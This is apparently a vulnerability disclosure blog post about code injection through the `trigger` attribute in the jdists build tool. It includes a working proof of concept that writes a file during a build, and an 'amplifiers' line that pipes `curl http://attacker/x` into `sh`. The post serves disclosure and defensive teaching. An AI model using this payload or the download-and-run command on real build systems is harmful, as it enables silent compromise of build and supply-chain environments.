---
layout: post
title: "From code processor to code execution: RCE in jdists"
date: 2026-08-17
---

# From code processor to code execution: RCE in jdists

**Summary.** `jdists` — a code-block processing tool used by Baidu's FIS
build ecosystem — evaluates the `trigger` attribute of a `<!--jdists ... -->`
block via `new Function`. The attribute comes straight from the file being
processed. Processing a malicious file therefore executes arbitrary code with
the build process's privileges. Verified with a file-write PoC; reported as
[zswang/jdists#16](https://github.com/zswang/jdists/issues/16).

---

## How the finding happened

The audit series had already produced two findings (a stack overflow and a
regex injection), both from low-maintenance packages. The strategy: keep
following the unmaintained corner of npm. `fis-parser-jdists` — a thin wrapper
around `jdists` — led to the core, and the core had three `new Function`
call sites. The interesting question was data flow: **do any of them evaluate
strings that come from the processed file?**

## The vulnerability chain

```text
file content: <!--jdists trigger="..."-->  →  node.attrs.trigger
        ↓
execTrigger(node.attrs.trigger)             // lib/scope.js
        ↓
new Function('return (' + trigger + ')' )() // line ~478
        ↓
arbitrary code execution
```

The `trigger` attribute is not restricted to known names — the safe path only
matches `^([\w-_]+)(,[\w-_]+)*$`. Anything else is handed to `new Function`
verbatim.

## The PoC (verified on jdists@2.2.4)

```js
const jdists = require('jdists')

const content = '<!--jdists trigger="(require(\'fs\').writeFileSync(\'pwned.txt\',\'PWNED\'),true)"-->keep<!--/jdists-->'

jdists.build(content, { fromString: true, remove: '' })
// build output: "keep"
// pwned.txt is created — the code ran
```

The build output looks completely normal. The file write happens silently
alongside it.

## Amplifiers

`lib/jdists.js` executes `global.require = require` for its template
processors — so the evaluated code has the entire Node module system:

```js
require('child_process').execSync('curl http://attacker/x | sh')
```

One malicious file in a build produces a fully compromised build environment.

## Why this is serious

Build tools process files that are not always authored by the person running
the build: third-party source, vendored code, CI artifacts, downloaded
templates. The supply-chain scenario is direct — a poisoned file in a
dependency graph reaches the parser, and the parser reaches `new Function`.

There is no known CVE for this. The package's last release is from 2018 and
the code has been there since.

## The honest part

`jdists` has a second `new Function` site in `querySelector`, which evaluates
quoted attribute values. I tested it specifically: **it is not exploitable** —
the selector regex only captures a balanced quoted literal, so the eval
returns a string, and escape tricks (escaped quotes, template literals) stay
inside the literal. It is a code smell, not a vulnerability. Only the
`trigger` path is verified, and that is what the report claims.

## The lesson

Code-processing tools are code-execution tools. The distance between
"processes your code" and "executes your code" is exactly one unescaped
attribute, one missing allowlist, one `new Function` that forgot to ask who
owns the string. When a tool evaluates file-derived content, it is a sandbox
boundary — and it should be treated, and tested, like one.

---

## 中文摘要

jdists（FIS 构建生态的代码块处理工具）把被处理文件里的 `trigger` 属性直接送进
`new Function('return (' + trigger + ')')()` 求值——没有任何白名单或沙箱。
实测 PoC：恶意 trigger 属性执行 `writeFileSync` 静默创建文件，构建输出完全正常。
放大因素：`global.require = require` 把整个 Node 模块系统暴露给被求值代码，
一个恶意文件就能在构建环境里执行任意命令（供应链场景）。已上报
[zswang/jdists#16](https://github.com/zswang/jdists/issues/16)，无已知 CVE。
诚实记录：另一个 `new Function` 点（selector 求值）实测**不可利用**（正则只
捕获平衡引号字面量），所以报告只声称验证过的 trigger 路径。核心教训：
处理代码的工具就是执行代码的工具——"处理你的代码"和"执行你的代码"之间，
只差一个没加白名单的属性。
